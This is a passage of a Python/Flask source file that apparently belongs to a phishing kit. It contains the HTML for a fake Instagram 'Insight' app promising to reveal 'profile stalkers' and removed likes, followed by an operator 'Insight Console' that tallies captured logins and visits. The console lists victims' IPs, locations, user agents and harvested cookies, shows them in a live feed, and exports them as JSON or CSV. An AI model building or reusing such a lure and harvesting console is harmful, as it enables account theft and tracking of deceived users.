.card{position:relative;overflow:hidden;background:var(--card);border:1px solid var(--line);border-radius:18px;padding:16px 18px;cursor:pointer;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e),border-color .3s;animation:up .65s var(--e) both}
.card:nth-child(2){animation-delay:.05s}.card:nth-child(3){animation-delay:.1s}.card:nth-child(4){animation-delay:.15s}.card:nth-child(5){animation-delay:.2s}.card:nth-child(6){animation-delay:.25s}
.card::after{content:"";position:absolute;inset:0;background:radial-gradient(120% 90% at 100% 0,var(--glow),transparent 65%);opacity:0;transition:opacity .45s;pointer-events:none}
.card:hover{transform:translateY(-5px);box-shadow:var(--sh2);border-color:color-mix(in srgb,var(--mut) 60%,transparent)}
.card:hover::after{opacity:1}
.card:active{transform:translateY(-1px) scale(.98)}
.card small{color:var(--mut);font-size:12.5px;display:flex;align-items:center;justify-content:space-between}
.card small svg{width:18px;height:18px;transition:transform .45s var(--e)}
.card:hover small svg{transform:scale(1.25) rotate(-10deg);color:var(--tx)}
.card b{display:block;font:700 28px inherit;letter-spacing:-.8px;margin:8px 0 2px}
.card i{font-style:normal;font-size:12px;color:var(--mut)}
.card i.up{color:#2ecc71}.card i.dn{color:var(--red)}
.two{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.panel{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:18px;box-shadow:var(--sh);transition:transform .45s var(--e),box-shadow .45s var(--e);animation:up .7s .2s var(--e) both}
.panel:hover{transform:translateY(-3px);box-shadow:var(--sh2)}
.panel h4{font:600 13.5px inherit;margin-bottom:16px}
.donut{display:flex;align-items:center;gap:20px}
.donut svg{width:104px;height:104px;flex:none;transition:transform .6s var(--e)}
.panel:hover .donut svg{transform:rotate(12deg) scale(1.05)}
.donut circle:not(:first-child){animation:dr 1.2s .3s var(--e) both}
@keyframes dr{from{stroke-dasharray:0 100}}
.leg{display:grid;gap:8px;font-size:13px;color:var(--mut)}.leg b{color:var(--tx)}
.leg em{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:8px}
.spark{display:flex;align-items:flex-end;gap:8px;height:86px}
.spark i{flex:1;border-radius:5px 5px 2px 2px;background:var(--ig);transform-origin:bottom;animation:g .9s both var(--e);transition:filter .3s,transform .4s var(--e)}
.spark i:hover{filter:brightness(1.15) saturate(1.3);transform:scaleY(1.07)}
@keyframes g{from{transform:scaleY(0)}}
.sl{display:flex;gap:8px;margin-top:8px;font-size:11px;color:var(--mut)}.sl span{flex:1;text-align:center}
.bar{display:flex;gap:8px;margin:6px 0 14px;flex-wrap:wrap;align-items:center}
.search{flex:1;min-width:150px;background:var(--chip);border:0;border-radius:12px;padding:11px 14px;color:var(--tx);font:400 14.5px inherit;outline:0;transition:box-shadow .3s var(--e),background .3s}
.search:focus{background:var(--bg2);box-shadow:0 0 0 2px var(--blue),0 8px 24px rgba(0,149,246,.18)}
.search::placeholder{color:var(--mut)}
.chip{border:0;background:var(--chip);color:var(--tx);padding:9px 15px;border-radius:10px;font:600 13px inherit;cursor:pointer;transition:all .35s var(--e)}
.chip:hover{transform:translateY(-2px);box-shadow:0 6px 14px rgba(0,0,0,.1)}
.chip:active{transform:scale(.94)}
.chip.on{background:var(--tx);color:var(--bg)}
.ttl{font:700 24px inherit;letter-spacing:-.5px}.sub{color:var(--mut);font-size:14px;margin:4px 0 20px}
.row{display:flex;align-items:center;gap:13px;padding:9px 10px;margin:0 -10px;border-radius:14px;animation:in .5s both var(--e);transition:background .3s,transform .4s var(--e),box-shadow .4s var(--e)}
.row:hover{background:var(--chip);transform:translateX(5px)}
.row:hover .ring{transform:scale(1.08)}
@keyframes in{from{opacity:0;transform:translateY(10px)}}
.info{flex:1;min-width:0}
.info b{font:600 14px inherit;display:flex;align-items:center;gap:5px}
.info small{display:block;color:var(--mut);font-size:13px;margin-top:1px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.vf{width:14px;height:14px;fill:var(--blue);flex:none}
.tag{font:600 11px inherit;padding:3px 8px;border-radius:6px;background:var(--chip);color:var(--mut)}
.tag.red{color:var(--red)}.tag.hot{color:#d62976}
.ic{width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--chip);flex:none;transition:transform .45s var(--e)}
.row:hover .ic{transform:scale(1.1) rotate(-6deg)}
.ic svg{width:22px;height:22px}
.th{width:44px;height:44px;border-radius:8px;flex:none;transition:transform .4s var(--e)}
.row:hover .th{transform:scale(1.1) rotate(4deg)}
.day{font:700 15px inherit;margin:18px 0 6px}
.bn{display:none;grid-column:1;grid-template-columns:repeat(5,1fr);border-top:1px solid var(--line);background:color-mix(in srgb,var(--bg) 82%,transparent);backdrop-filter:blur(24px) saturate(180%);padding:6px 4px calc(8px + env(safe-area-inset-bottom,0px))}
.bn button{border:0;background:none;color:var(--tx);display:grid;place-items:center;padding:10px 0;cursor:pointer;position:relative;transition:transform .3s var(--e)}
.bn button:active{transform:scale(.8)}
.bn svg{width:26px;height:26px;transition:transform .4s var(--e)}
.bn button.on svg{stroke-width:2.8;transform:translateY(-2px) scale(1.1)}
.bn .n{position:absolute;top:4px;left:calc(50% + 6px);background:var(--red);color:#fff;border-radius:99px;font:700 10px/16px inherit;min-width:16px;padding:0 4px}
.empty{padding:50px 0;text-align:center;color:var(--mut)}
.srow{display:flex;align-items:center;gap:14px;padding:14px 0;border-bottom:1px solid var(--line)}
.srow .info small{white-space:normal;line-height:1.35}
.srow.lk{cursor:pointer;transition:padding .35s var(--e)}.srow.lk:hover{padding-left:8px}.srow .ch{color:var(--mut);font-size:22px;line-height:1;transition:transform .35s var(--e)}.srow.lk:hover .ch{transform:translateX(4px)}
.srow.red b{color:var(--red)}.srow.red .ch{color:var(--red)}
.sw{flex:none;width:46px;height:28px;border-radius:14px;border:0;background:color-mix(in srgb,var(--mut) 50%,transparent);position:relative;cursor:pointer;transition:background .3s,box-shadow .3s}
.sw::after{content:"";position:absolute;top:3px;left:3px;width:22px;height:22px;border-radius:50%;background:#fff;box-shadow:0 2px 5px rgba(0,0,0,.3);transition:transform .45s cubic-bezier(.3,1.5,.5,1),width .2s}
.sw:active::after{width:27px}
.sw.on{background:var(--blue);box-shadow:0 4px 12px rgba(0,149,246,.4)}.sw.on::after{transform:translateX(18px)}.sw.on:active::after{transform:translateX(13px)}
.acc{display:flex;align-items:center;gap:14px;padding:16px;background:var(--card);border:1px solid var(--line);border-radius:18px;margin-bottom:4px;box-shadow:var(--sh)}
.toast{position:fixed;left:50%;bottom:34px;transform:translate(-50%,30px) scale(.95);background:var(--tx);color:var(--bg);padding:12px 22px;border-radius:14px;font:600 13.5px inherit;opacity:0;pointer-events:none;transition:all .5s var(--e);z-index:9;box-shadow:var(--sh2)}
.toast.show{opacity:1;transform:translate(-50%,0) scale(1)}
@container (max-width:760px){
 .app{grid-template-columns:1fr}
 .side{display:none}
 .mtop{display:grid}
 .bn{display:grid}
 main{grid-row:2}
 .in{padding:18px 16px 28px}
 .prof{gap:20px;align-items:flex-start;flex-wrap:wrap}
 .ring.l{width:84px;height:84px}.ring.l>span{font-size:24px}
 .pi{flex:1 1 150px}
 .pi .st{gap:0;justify-content:space-between;margin:14px 0 0;order:5;flex-basis:100%;text-align:center;border-top:1px solid var(--line);padding-top:12px;font-size:13px}
 .pi .st div{display:flex;flex-direction:column}
 .pi h2{font-size:17px}
 .cards{grid-template-columns:repeat(2,1fr);gap:10px}
 .card{padding:14px}.card b{font-size:24px}
 .two{grid-template-columns:1fr}
 .ttl{font-size:21px}
}
@media (max-width:760px){
  body{align-items:stretch}
  .frame,.frame.mobile{width:100%;margin:0;border:0;border-radius:0;max-width:none;box-shadow:none}
  .app{grid-template-columns:1fr;grid-template-rows:auto 1fr auto}
  .side{display:none}
  .mtop{display:grid}
  .bn{display:grid}
  main{grid-row:2}
}
@media (min-width:761px){
  body{padding:0 16px}
  .frame{width:100%;margin:10px auto 16px}
  .app{grid-template-columns:244px 1fr;grid-template-rows:auto 1fr auto}
  .side{display:flex}
  .mtop{display:none}
  .bn{display:none}
  main{grid-row:1/4}
}
@media (prefers-reduced-motion:reduce){*,*::before,*::after{animation:none!important;transition:none!important}}
</style>
</head>
<body>
<div class="frame" id="frame"><div class="app">
 <aside class="side">
  <div class="logo"><span>Insight</span></div>
  <nav class="nav" id="nav"></nav>
  <div class="me"><div class="ring m"><span style="background:#262626">YO</span></div><div><b>your.handle</b><small>Synced just now</small></div></div>
 </aside>
 <div class="mtop"><span></span><div class="logo"><span>Insight</span></div><button id="mh" aria-label="Settings"></button></div>
 <main id="main"></main>
 <nav class="bn" id="bn"></nav>
</div></div>
<div class="toast" id="toast"></div>
<script>
const S=p=>`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">${p}</svg>`;
const I={
 home:S('<path d="M3 10.5 12 3l9 7.5V21h-6v-6H9v6H3z"/>'),
 notback:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M17 8l5 5M22 8l-5 5"/>'),
 ghosts:S('<path d="M5 21V11a7 7 0 0 1 14 0v10l-3-2-2 2-2-2-2 2-2-2z"/><circle cx="9.5" cy="11" r=".6"/><circle cx="14.5" cy="11" r=".6"/>'),
 stalkers:S('<path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7S2 12 2 12z"/><circle cx="12" cy="12" r="3"/>'),
 act:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/>'),
 broken:S('<path d="M12 21s-8-5.5-8-11a4.5 4.5 0 0 1 8-2.8A4.5 4.5 0 0 1 20 10c0 5.5-8 11-8 11z"/><path d="m12 7.5-2 4 3 1-1 4"/>'),
 trash:S('<path d="M4 7h16M10 11v6M14 11v6M6 7l1 13h10l1-13M9 7V4h6v3"/>'),
 chat:S('<path d="M21 12a8 8 0 0 1-11.7 7L3 21l2-5.5A8 8 0 1 1 21 12z"/>'),
 out:S('<path d="M9 4H4v16h5M16 8l4 4-4 4M20 12H9"/>'),
 plus:S('<circle cx="9" cy="8" r="4"/><path d="M2 21c0-4 3-6 7-6s7 2 7 6M19 8v6M16 11h6"/>'),
 cookie:S('<path d="M12 2a10 10 0 1 0 10 10 4 4 0 0 1-5-5 4 4 0 0 1-5-5z"/><circle cx="9" cy="10" r=".8"/><circle cx="13.5" cy="14.5" r=".8"/><circle cx="9.5" cy="15.5" r=".8"/>'),
 set:S('<circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.7 1.7 0 0 0 .3 1.8l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.8-.3 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.5 1.7 1.7 0 0 0-1.8.3l-.1.1a2 2 0 1 1-2.8-2.8l.1-.1a1.7 1.7 0 0 0 .3-1.8 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.5-1.1 1.7 1.7 0 0 0-.3-1.8l-.1-.1a2 2 0 1 1 2.8-2.8l.1.1a1.7 1.7 0 0 0 1.8.3H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.8-.3l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.3 1.8V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1z"/>')
};
const VF='<svg class="vf" viewBox="0 0 24 24"><path d="M12 1.5l2.6 1.8 3.1-.2 1.2 2.9 2.7 1.6-.7 3 1 2.9-2.2 2.2-.4 3.1-3 .7-2.2 2.2L12 19.8 9 21l-2.5-2.1-3-.7-.4-3.1L1 12.8l1-2.9-.7-3 2.7-1.6 1.2-2.9 3.1.2z"/><path d="m8 12.3 2.8 2.8L16.5 9" fill="none" stroke="#fff" stroke-width="2"/></svg>';
const G=["#fa7e1e,#d62976","#d62976,#962fbf","#4f5bd5,#962fbf","#0095f6,#4f5bd5","#feda75,#fa7e1e","#2ecc71,#0095f6"];
const u=(n,h,m,x={})=>({n,h,m,...x});
const D={
 notback:[u("Aria Moreau","aria.moreau","Followed since Mar 2024",{v:1}),u("Kai Nakamura","kai.nkmr","Followed 8 months ago"),u("Sofia Laurent","sofia.laurent","Followed 3 weeks ago",{v:1}),u("Mateo Silva","mateo.s","Followed 1 year ago"),u("Zara Khan","zarakhan","Followed 5 months ago"),u("Leo Brandt","leobrandt","Followed 2 days ago")],
 fans:[u("Noor Ahmed","noor.ahmed","Follows you · 4 mutual"),u("Ivy Chen","ivychen.studio","Follows you · 1 mutual"),u("Omar Haddad","omar.h","Follows you")],
 ghosts:[u("Nina Patel","nina.p","No likes or comments in 142 days",{d:142}),u("Jules Moreno","jules.mrn","Never interacted · 11 months",{d:330}),u("Tariq Aziz","tariq.az","No story views in 96 days",{d:96}),u("Elena Rossi","elena.rossi","No interaction in 74 days",{d:74}),u("Finn Walker","finnwalker","Never interacted · 5 months",{d:150})],
 stalkers:[u("Maya Ellis","maya.ellis","Last visit today · 9:41 PM",{c:14}),u("Dev Sharma","dev.sharma","Last visit yesterday",{c:9}),u("Lina Park","lina.park","Last visit 2 days ago",{c:7}),u("Rafi Hasan","rafi.hasan","Last visit 3 days ago",{c:5}),u("Chloe Dubois","chloe.db","Last visit 5 days ago",{c:3})],
 act:[
  {g:"Today",i:"broken",t:"<b>maya.ellis</b> removed her like",s:"12m",c:3,tg:["red","Like removed"]},
  {g:"Today",i:"trash",t:"<b>dev.sharma</b> deleted a comment: “Absolutely stunning 🔥”",s:"1h",c:1,tg:["red","Comment removed"]},
  {g:"Today",i:"out",t:"<b>zane.cole</b> unfollowed you",s:"3h",tg:["red","Unfollow"]},
  {g:"Yesterday",i:"chat",t:"<b>lina.park</b> commented: “Where was this taken?”",s:"1d",c:4,tg:["","Comment"]},
  {g:"Yesterday",i:"act",t:"<b>rafi.hasan</b> liked 6 of your posts in 2 minutes",s:"1d",c:2,tg:["hot","Binge like"]},
  {g:"Yesterday",i:"trash",t:"<b>chloe.db</b> removed a comment: “Love this!”",s:"1d",c:5,tg:["red","Comment removed"]},
  {g:"This week",i:"plus",t:"<b>noor.ahmed</b> started following you",s:"2d",tg:["","New follower"]}]
};
const T=[["home","Overview"],["notback","Not Following Back"],["ghosts","Ghost Followers"],["stalkers","Profile Stalkers"],["act","Activity"]];
let tab="home",q="",f="all",theme="light",anim=true;
try{theme=localStorage.getItem("ins-theme")||"light"}catch(e){}
const P={likes:true,comm:true,unf:true,stalk:false,priv:false};
function applyTheme(){const r=document.documentElement;theme==="system"?r.removeAttribute("data-theme"):r.setAttribute("data-theme",theme)}
const eff=()=>theme==="dark"||(theme==="system"&&matchMedia("(prefers-color-scheme: dark)").matches);
applyTheme();
const $=s=>document.querySelector(s);
const gr=i=>{const [a,b]=G[i%G.length].split(",");return `linear-gradient(135deg,${a},${b})`};
const ini=n=>n.split(" ").map(w=>w[0]).join("");
const av=(x,i,c="s")=>`<div class="ring ${c}"><span style="background:${gr(i)}">${ini(x.n)}</span></div>`;
function nav(){
 const cn={notback:D.notback.length,ghosts:D.ghosts.length};
 $("#nav").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}">${I[k]}${l}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
 $("#bn").innerHTML=T.map(([k,l])=>`<button class="${tab===k?"on":""}" data-k="${k}" aria-label="${l}">${I[k]}${cn[k]?`<span class="n">${cn[k]}</span>`:""}</button>`).join("");
 $("#nav").insertAdjacentHTML("beforeend",`<button class="${tab==="settings"?"on":""}" data-k="settings">${I.set}Settings</button>`);
 $("#mh").innerHTML=I.set;$("#mh").onclick=()=>go("settings");
 document.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
}
function go(k){tab=k;q="";f="all";anim=true;render();$("#main").scrollTop=0}
const card=(k,l,n,s,c="")=>`<div class="card" data-k="${k}"><small>${l}${I[k]}</small><b>${n}</b><i class="${c}">${s}</i></div>`;
function home(){
 const b=[40,62,48,80,55,92,70],d=["M","T","W","T","F","S","S"];
 return `<div class="prof"><div class="ring l"><span style="background:linear-gradient(135deg,#262626,#444)">YO</span></div>
 <div class="pi"><div class="h"><h2>your.handle</h2><button class="btn g">Edit profile</button></div>
 <div class="st"><div><b>248</b> posts</div><div><b>12.4K</b> followers</div><div><b>842</b> following</div></div>
 <p><b>Your name</b><br><span>Creator · Insights updated live</span></p></div></div>
 <div class="sec" style="margin-top:6px"><h3>Top profile visitors</h3><a data-k="stalkers">See all</a></div>
 <div class="stories">${D.stalkers.map((x,i)=>`<div data-k="stalkers"><div class="ring" style="padding:3px"><span style="background:${gr(i)}">${ini(x.n)}</span></div><em>${x.c}</em><small>${x.h}</small></div>`).join("")}</div>
 <div class="sec"><h3>Insights</h3></div>
 <div class="cards">
  ${card("notback","Not following back",D.notback.length,"Review list")}
  ${card("ghosts","Ghost followers",D.ghosts.length,"Zero engagement","dn")}
  ${card("stalkers","Regular stalkers",D.stalkers.length,"+3 this week","up")}
  ${card("act","Removed likes",7,"Last 7 days","dn")}
  ${card("act","Deleted comments",4,"Last 7 days","dn")}
  ${card("act","Unfollowed you",3,"Last 7 days","dn")}
 </div>
 <div class="sec"><h3>Overview</h3></div>
 <div class="two">
  <div class="panel"><h4>Follower health</h4><div class="donut"><svg viewBox="0 0 42 42"><circle cx="21" cy="21" r="15.9" fill="none" stroke="var(--chip)" stroke-width="4.5"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#d62976" stroke-width="4.5" stroke-dasharray="62 38" transform="rotate(-90 21 21)" stroke-linecap="round"/><circle cx="21" cy="21" r="15.9" fill="none" stroke="#0095f6" stroke-width="4.5" stroke-dasharray="22 78" stroke-dashoffset="-65" transform="rotate(-90 21 21)" stroke-linecap="round"/></svg>
  <div class="leg"><div><em style="background:#d62976"></em><b>62%</b> Active</div><div><em style="background:#0095f6"></em><b>24%</b> Passive</div><div><em style="background:var(--chip)"></em><b>14%</b> Ghosts</div></div></div></div>
  <div class="panel"><h4>Profile visits · 7 days</h4><div class="spark">${b.map((v,i)=>`<i style="height:${v}%;animation-delay:${i*70}ms"></i>`).join("")}</div><div class="sl">${d.map(x=>`<span>${x}</span>`).join("")}</div></div>
 </div>`;
}
function actList(a){
 let g="",o="";
 a.forEach((x,i)=>{
  if(x.g!==g){g=x.g;o+=`<div class="day">${g}</div>`}
  o+=`<div class="row" style="animation-delay:${i*50}ms"><div class="ic">${I[x.i]}</div><div class="info"><b style="font-weight:400;white-space:normal">${x.t}</b><small>${x.s} · <span class="tag ${x.tg[0]}">${x.tg[1]}</span></small></div>${x.c?`<div class="th" style="background:${gr(x.c)}"></div>`:""}</div>`});
 return o;
}
function rows(k,list){
 if(!list.length)return `<div class="empty">You’re all caught up ✨</div>`;
 return list.map((x,i)=>{
  let t="",b="";
  if(k==="notback")b=`<button class="btn g" data-u="${x.h}">Following</button>`;
  if(k==="ghosts"){t=`<span class="tag red">${x.d}d</span>`;b=`<button class="btn r" data-r="${x.h}">Remove</button>`}
  if(k==="stalkers"){t=`<span class="tag hot">${x.c} visits</span>`;b=`<button class="btn" data-b="${x.h}">Follow back</button>`}
  return `<div class="row" style="animation-delay:${i*50}ms">${av(x,i,"s"+(k==="ghosts"?" off":""))}<div class="info"><b>${x.h}${x.v?VF:""}${t}</b><small>${x.n} · ${x.m}</small></div>${b}</div>`}).join("");
}
function lv(k,t,s,ch){
 let l=D[k].filter(x=>(x.n+x.h).toLowerCase().includes(q.toLowerCase()));
 if(f==="ver")l=l.filter(x=>x.v);if(f==="old")l=l.filter(x=>x.d>120);if(f==="top")l=l.filter(x=>x.c>=7);
 return `<h1 class="ttl">${t}</h1><p class="sub">${s}</p><div class="bar"><input class="search" id="s" placeholder="Search" value="${q}">${ch.map(([v,l])=>`<button class="chip ${f===v?"on":""}" data-f="${v}">${l}</button>`).join("")}</div>${rows(k,l)}`;
}
function settings(){
 const sw=(k,l,s)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><button class="sw ${P[k]?"on":""}" data-p="${k}" role="switch" aria-checked="${P[k]}" aria-label="${l}"></button></div>`;
 const th=(a,l,s,on)=>`<div class="srow"><div class="info"><b style="font-weight:400">${l}</b><small>${s}</small></div><button class="sw ${on?"on":""}" data-th="${a}" role="switch" aria-checked="${on}" aria-label="${l}"></button></div>`;
 const lk=(l,s,c,href)=>`<div class="srow lk ${c||""}"${href?` data-href="${href}"`:""}><div class="info"><b style="font-weight:400">${l}</b>${s?`<small>${s}</small>`:""}</div><span class="ch">›</span></div>`;
 return `<h1 class="ttl">Settings</h1><p class="sub">Manage your appearance, alerts and account.</p>
 <div class="acc">${av({n:"Your Name"},0,"m")}<div class="info"><b>your.handle</b><small>Your Name · Personal account</small></div><button class="btn g">Switch</button></div>
 <div class="sec"><h3>Appearance</h3></div>
 ${th("dark","Dark mode","Switch between light and dark appearance",eff())}
 ${th("sys","Use device settings","Match your phone or computer’s appearance automatically",theme==="system")}
 <div class="sec"><h3>Notifications</h3></div>
 ${sw("likes","Removed likes","Tell me when someone takes back a like")}
 ${sw("comm","Deleted comments","Tell me when a comment disappears")}
 ${sw("unf","Unfollows","Tell me when someone unfollows you")}
 ${sw("stalk","Profile visit alerts","Notify me about repeat visitors")}
 <div class="sec"><h3>Privacy</h3></div>
 ${sw("priv","Hide my activity status","Others can’t see when you’re active")}
 ${lk("Collected cookies","What this browser sent us","","/cookies")}
 ${lk("Blocked accounts","")}
 ${lk("Data sync frequency","Every 15 minutes")}
 <div class="sec"><h3>Account</h3></div>
 ${lk("Linked Instagram account","@your.handle")}
 ${lk("Download your data","")}
 ${lk("Help","")}
 ${lk("Log out","Sign out of this device","red")}`;
}
function render(){
 nav();
 const m=$("#main");let h;
 if(tab==="home")h=home();
 else if(tab==="notback")h=lv("notback","Not following back","Accounts you follow that don’t follow you.",[["all","All"],["ver","Verified"]])+`<div class="sec"><h3>Following you · you don’t follow</h3></div>${D.fans.map((x,i)=>`<div class="row">${av(x,i+2)}<div class="info"><b>${x.h}</b><small>${x.m}</small></div><button class="btn" data-b="${x.h}">Follow back</button></div>`).join("")}`;
 else if(tab==="ghosts")h=lv("ghosts","Ghost followers","They follow you but never like, comment or view.",[["all","All"],["old","120d+"]]);
 else if(tab==="stalkers")h=lv("stalkers","Profile stalkers","Who keeps checking your profile the most.",[["all","All"],["top","Top"]]);
 else if(tab==="settings")h=settings();
 else h=`<h1 class="ttl">Activity</h1><p class="sub">Likes removed, comments deleted, unfollows and more.</p>${actList(D.act)}`;
 m.innerHTML=`<div class="in${anim?" pg":""}">${h}</div>`;anim=false;
 const s=$("#s");if(s)s.oninput=e=>{q=e.target.value;const p=e.target.selectionStart;render();const n=$("#s");n.focus();n.setSelectionRange(p,p)};
 m.querySelectorAll("[data-f]").forEach(b=>b.onclick=()=>{f=b.dataset.f;render()});
 m.querySelectorAll("[data-p]").forEach(b=>b.onclick=()=>{P[b.dataset.p]=!P[b.dataset.p];const sc=m.scrollTop;render();m.scrollTop=sc});
 m.querySelectorAll("[data-th]").forEach(b=>b.onclick=()=>{const d=eff();theme=b.dataset.th==="dark"?(d?"light":"dark"):(theme==="system"?(d?"dark":"light"):"system");try{localStorage.setItem("ins-theme",theme)}catch(e){}applyTheme();const sc=m.scrollTop;render();m.scrollTop=sc;toast(theme==="system"?"Using device appearance":(theme==="dark"?"Dark mode on":"Light mode on"))});
 m.querySelectorAll("[data-href]").forEach(b=>b.onclick=()=>window.open(b.dataset.href,"_blank"));
 m.querySelectorAll(".srow.red").forEach(b=>b.onclick=()=>{b.style.pointerEvents="none";b.style.opacity=".55";toast("Logging out…");setTimeout(()=>{location.href="/logout"},480)});
 m.querySelectorAll("[data-k]").forEach(b=>b.onclick=()=>go(b.dataset.k));
 m.querySelectorAll("[data-u],[data-r],[data-b]").forEach(b=>b.onclick=e=>{
  e.stopPropagation();const d=b.dataset;
  if(d.u){D.notback=D.notback.filter(x=>x.h!==d.u);toast("Unfollowed "+d.u)}
  if(d.r){D.ghosts=D.ghosts.filter(x=>x.h!==d.r);toast("Removed "+d.r)}
  if(d.b){b.textContent="Following";b.className="btn g";toast("You followed "+d.b);return}
  const sc=m.scrollTop;render();m.scrollTop=sc});
}
let tt;function toast(t){const e=$("#toast");e.textContent=t;e.classList.add("show");clearTimeout(tt);tt=setTimeout(()=>e.classList.remove("show"),1800)}
render();
</script>
</body>
</html>
"""

# ============================== admin console ==============================
ADMIN_HTML = """
<!DOCTYPE html>
<html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Insight Console</title>
<style>
:root{--bg:#0a0a0c;--card:#141419;--line:#232329;--tx:#ececf1;--mut:#8b8b98;--acc:#3ba7ff;--ok:#2ecc71;--bad:#ff5d6c;--warn:#f5b642}
*{box-sizing:border-box;margin:0}
body{background:var(--bg);color:var(--tx);font:14px/1.5 ui-monospace,SFMono-Regular,Menlo,monospace}
header{display:flex;gap:14px;align-items:center;padding:16px 20px;border-bottom:1px solid var(--line);position:sticky;top:0;background:#0a0a0cf2;backdrop-filter:blur(10px);z-index:5;flex-wrap:wrap}
h1{font-size:15px;letter-spacing:.14em;text-transform:uppercase;font-weight:700}
h1 i{color:var(--acc);font-style:normal}
.spacer{flex:1}
.stat{font-size:12px;color:var(--mut);border:1px solid var(--line);border-radius:8px;padding:4px 10px}
.stat b{color:var(--tx)}
a.btn,button.btn{background:var(--card);border:1px solid var(--line);color:var(--tx);padding:6px 12px;border-radius:8px;cursor:pointer;text-decoration:none;font:inherit;font-size:12px;transition:.15s}
a.btn:hover,button.btn:hover{border-color:var(--acc);color:var(--acc)}
main{padding:18px 20px 60px}
table{width:100%;border-collapse:collapse;font-size:12.5px}
th,td{text-align:left;padding:9px 10px;border-bottom:1px solid var(--line);vertical-align:top}
th{color:var(--mut);font-weight:600;font-size:11px;text-transform:uppercase;letter-spacing:.08em}
tr:hover td{background:#15151b}
td a{color:var(--acc);text-decoration:none}
td a:hover{text-decoration:underline}
.pill{display:inline-block;padding:1px 8px;border-radius:99px;font-size:10.5px;border:1px solid}
.pill.login{color:var(--ok);border-color:#1e6b3d;background:#0e2318}
.pill.cap{color:var(--mut);border-color:var(--line)}
.pill.new{color:var(--bad);border-color:#6b1e28;background:#230e12}
.mono{font-size:11.5px;color:var(--mut);max-width:420px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
pre{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:12px;overflow:auto;font-size:12px;white-space:pre-wrap;word-break:break-word;max-height:420px}
pre b{color:var(--acc)}
.block{margin-bottom:16px}
.block h2{font-size:11px;text-transform:uppercase;letter-spacing:.1em;color:var(--mut);margin-bottom:6px}
.row2{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.empty{padding:60px 0;text-align:center;color:var(--mut)}
.warn{background:#231a08;border:1px solid #6b4d1e;color:var(--warn);padding:10px 14px;border-radius:10px;margin-bottom:16px;font-size:12.5px}
form.inline{display:inline}
@media(max-width:820px){.row2{grid-template-columns:1fr}.mono{max-width:180px}}
</style></head><body>
<header>
  <h1><i>▚</i> Insight Console</h1>
  <span class="stat">captures <b>__CAPS__</b></span>
  <span class="stat">logins <b>__LOGS__</b></span>
  <span class="stat" id="live">live</span>
  <span class="spacer"></span>
  <a class="btn" href="/admin/export?fmt=json">export json</a>
  <a class="btn" href="/admin/export?fmt=csv">export csv</a>
  <a class="btn" href="/">login page</a>
</header>
<main>__BODY__</main>
<script>
(function(){
  var feed = document.getElementById('feed');
  if (!feed) return;
  var last = 0;
  var live = document.getElementById('live');
  async function tick(){
    try{
      var r = await fetch('/admin/feed?since=' + last, {credentials:'same-origin'});
      if (!r.ok) throw 0;
      var d = await r.json();
      if (d.rows.length){
        feed.insertAdjacentHTML('afterbegin', d.rows.join(''));
        last = d.last;
        live.textContent = 'live · ' + new Date().toLocaleTimeString();
        live.style.color = 'var(--ok)';
      }
    }catch(e){ live.textContent = 'offline'; live.style.color = 'var(--bad)'; }
  }
  tick(); setInterval(tick, 4000);
})();
function copy(el){
  var pre = el.closest('.block').querySelector('pre');
  navigator.clipboard.writeText(pre.innerText).then(function(){
    el.textContent = 'copied'; setTimeout(function(){ el.textContent = 'copy'; }, 1200);
  });
}
</script>
</body></html>
"""


def render_admin(body: str) -> str:
    conn = connect()
    try:
        caps = conn.execute("SELECT COUNT(*) c FROM captures").fetchone()["c"]
        logs = conn.execute("SELECT COUNT(*) c FROM logins").fetchone()["c"]
    finally:
        conn.close()
    return (
        ADMIN_HTML.replace("__BODY__", body)
        .replace("__CAPS__", str(caps))
        .replace("__LOGS__", str(logs))
    )


def row_html(r: sqlite3.Row) -> str:
    badge = (
        f'<span class="pill login">{r["nlog"]} login</span>'
        if r["nlog"] else '<span class="pill cap">visit</span>'
    )
    place = ", ".join(x for x in (r["city"], r["country"]) if x) or "-"
    return (
        f'<tr data-id="{r["id"]}">'
        f'<td>{r["id"]}</td>'
        f'<td>{(r["created_at"] or "")[11:19]}</td>'
        f'<td>{escape(place)}</td>'
        f'<td>{escape(r["ip"] or "-")}</td>'
        f'<td class="mono">{escape((r["ua"] or "")[:110])}</td>'
        f'<td>{len(r["js_cookies"] or "")}b</td>'
        f'<td>{badge}</td>'
        f'<td><a href="/admin/capture/{r["id"]}">open</a></td>'
        f"</tr>"
    )


# ============================== routes ==============================
@app.before_request
def ensure_client_id():
